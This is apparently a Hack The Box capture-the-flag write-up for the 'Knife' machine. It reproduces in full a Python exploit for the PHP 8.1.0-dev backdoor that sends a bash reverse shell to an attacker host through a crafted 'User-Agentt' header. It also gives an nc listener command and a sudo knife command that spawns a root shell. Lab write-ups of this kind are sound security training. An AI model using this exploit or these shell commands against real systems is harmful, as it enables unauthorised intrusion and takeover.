---
cover: ../../.gitbook/assets/Knife.png
coverY: 254.84799999999998
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Knife

Add vhost :

```bash
echo '10.129.237.79 knife.htb'|tee -a /etc/hosts'
```

Scan :

```bash
nmap knife.htb
```

Open ports :

* `22/TCP` : SSH
* `80/TCP` : HTTP

Check service behind port `80/TCP` :

```bash
whatweb knife.htb
```

The result is :

```
http://knife.htb [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.237.79], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```

Check exploit for `php 8.1.0-dev`. There is an exploit [here](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell\_php\_8.1.0-dev.py). Before executing the Python code, I run `nc -lnvp 1234`.

```py
#!/usr/bin/env python3
import argparse,requests

request = requests.Session()

def checkTarget(url):
	response = requests.get(url)
	for header in response.headers.items():
		if "PHP/8.1.0-dev" in header[1]:
			return True
	return False

def reverseShell(lhost, lport, url):
	payload = "bash -c \"bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1\""
	headers = {"User-Agentt": "zerodiumsystem('" + payload + "');"}
	print(headers)
	injection = request.get(url, headers=headers, allow_redirects=False)

def main():
	url = input("url : ")
	lhost = input("lhost : ")
	lport = input("lport : ")

	if checkTarget(url):
		print("Host is vulnerable")
		reverseShell(lhost, lport, url)
	else:
		print("Host is not available or vulnerable, aborting...")
		exit

if __name__ == "__main__":
	main()
```

When I execute the payload, I enter `http://knife.htb`, `10.10.14.81` and `1234`. I get the reverse shell.

```sh
cat /home/james/user.txt
```

Result of `sudo -l` :

```
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

I can run `sudo /usr/bin/knife` without password. I execute the following command :

```sh
sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
```

I gain root privileges :

```sh
cat root/root.txt
```
